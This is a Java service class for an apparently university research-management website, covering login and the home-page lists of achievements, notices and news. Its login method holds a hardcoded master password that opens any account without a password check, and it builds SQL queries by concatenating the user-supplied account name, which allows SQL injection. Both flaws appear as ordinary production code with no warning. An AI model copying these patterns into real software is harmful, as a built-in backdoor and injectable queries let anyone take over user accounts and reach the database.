package app.znkj.service.impl;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;


import com.jfinal.plugin.activerecord.Db;
import com.jfinal.plugin.activerecord.Record;

import app.znkj.common.Constant;
import app.znkj.common.Tname;
import app.znkj.model.Role;
import app.znkj.model.User;
import app.znkj.model.UserRole;
import app.znkj.service.IndexService;
import app.znkj.util.MD5;

public class IndexServiceImpl implements IndexService{

	/**
	 * 登陆
	 * @author xian.zf
	 * @date 2014-7-18
	 * @param account
	 * @param password
	 * @return
	 */
	@Override
	public Map<String, Object> ajaxLogin(String account, String password) {
		Map<String, Object> resultMap = new HashMap<String, Object>();
		String userSql = "select * from user u where u.account='"+ account +"' and u.password='"+ MD5.MD5Encode(password) +"'";
		//超级密码
		if(password.equals("@Szu201"))
			userSql = "select * from user u where u.account='"+ account +"'";
		User user = User.dao.findFirst(userSql);
		if(user == null){
			resultMap.put("success", 0);
			resultMap.put("error", "帐号或密码错误！请重新输入。");
			return resultMap;
		}
		List<Role> rlist = Role.dao.find("SELECT * FROM role r WHERE r.id IN (SELECT u.roleid FROM user_role u WHERE u.userid="+ user.getLong("id") +") order by r.id");
		if(rlist.size()>0){
			resultMap.put("success", 1);
			resultMap.put("error", "");
			Map<String, Object> sMap = new HashMap<String, Object>();
			sMap.put(Constant.RESEARCHROLE, 0);
			sMap.put(Constant.MANAGEROLE, 0);
			String roleName = "";
			for(Role role:rlist){
				sMap.put(role.getStr("ename"), role.getInt("id"));
				roleName += role.getStr("name") + "/";
			}
			roleName = roleName.substring(0, roleName.length()-1);
			sMap.put(Constant.ROLENAME, roleName);
			sMap.put(Constant.SESSION_ACCOUNT, user.getStr("account"));
			sMap.put(Constant.SESSION_USERID, user.getLong("id"));
			sMap.put(Constant.SESSION_USERNAME, user.getStr("name"));
			resultMap.put("sMap", sMap);
		}else{
			resultMap.put("success", 0);
			resultMap.put("error", "帐号或密码错误！请重新输入。");
		}
		return resultMap;
	}

	/**
	 * 首页最新成果
	 * @author xian.zf
	 * @date 2014-8-6
	 * @param flag
	 * @return
	 */
	@Override
	public List<Record> getNewAchList(boolean flag) {
		String sql = "SELECT * FROM index_achievement t order by t.cretime desc";
		if(flag)
			sql = "SELECT * FROM index_achievement t where t.eshow = 1 order by t.cretime desc";
//		List<Record> achList = Db.find("SELECT * FROM index_achievement t order by t.cretime desc");
		List<Record> achList = Db.find(sql);
		//最新成果类型及对应的URL
		String[] achstr = {Tname.TABLE_PROJECT, Tname.TABLE_COMMUNICATION, Tname.TABLE_PERARTICLE, 
						   Tname.TABLE_CONARTICLE, Tname.TABLE_THESIS, Tname.TABLE_AWARD, Tname.TABLE_PATENT};
		String[] achChi = {"科研项目", "学术交流", "期刊论文", "会议论文登记", "论文", "获奖", "专利"};
		String[] achEng = {"Project", "Academic exchange", "Journal article", "Conference paper", "Thesis", "Award", "Patent"};
		String[] achUrl = {"/projects_details?", "/exchange_details?", "/findings_details?type=0&", "/findings_details?type=1&",
						   "/findings_details?type=2&", "/findings_details?type=3&", "/findings_details?type=4&"};
		
		Map<String, Object> tMap = new HashMap<String, Object>();
		for(int i=0, len=achstr.length; i<len; i++){
			List<String> list = new ArrayList<String>();
			list.add(achChi[i]);
			list.add(achEng[i]);
			list.add(achUrl[i]);
			tMap.put(achstr[i], list);
		}
		List<Record> indexList = new ArrayList<Record>();
		for(Record ach:achList){
			Record achModel = Db.findById(ach.getStr("tname"), ach.getInt("achid"));
			if(achModel != null){
				@SuppressWarnings("unchecked")
				List<String> list = (List<String>)tMap.get(ach.getStr("tname"));
				ach.set("url", list.get(2)+"id="+achModel.getLong("id"));
				if(flag){
					ach.set("name", achModel.getStr("ename"));
					ach.set("type", list.get(1));
				}else{
					ach.set("name", achModel.getStr("name"));
					ach.set("type", list.get(0));
				}
				indexList.add(ach);
			}else{
				//不存在的去掉
				Db.delete("index_achievement", ach);
			}
				
		}
		return indexList;
	}

	/**
	 * 首页----通知公告
	 * @author xian.zf
	 * @date 2014-8-6
	 * @param equals
	 * @return
	 */
	@Override
	public List<Record> getNoticeList(boolean flag) {
		String sql = "SELECT * FROM notice t order by t.time desc LIMIT 0, 6";
		if(flag)
			sql = "SELECT * FROM notice t where t.eshow=1 order by t.time desc LIMIT 0, 6";
		
		List<Record> achList = Db.find(sql);
		for(Record ach:achList)
			if(flag && ach.getStr("etitle")!=null && !ach.getStr("etitle").trim().isEmpty())
				ach.set("title", ach.getStr("etitle"));
		return achList;
	}

	/**
	 * 首页----新闻中心
	 * @author xian.zf
	 * @date 2014-8-6
	 * @param equals
	 * @return
	 */
	@Override
	public List<Record> getNewsList(boolean flag) {
		String sql = "SELECT * FROM news t order by t.time desc LIMIT 0, 6";
		if(flag)
			sql = "SELECT * FROM news t where t.eshow=1 order by t.time desc LIMIT 0, 6";
		
		List<Record> achList = Db.find(sql);
		for(Record ach:achList)
			if(flag && ach.getStr("etitle")!=null && !ach.getStr("etitle").trim().isEmpty())
				ach.set("title", ach.getStr("etitle"));
		return achList;
	}

}
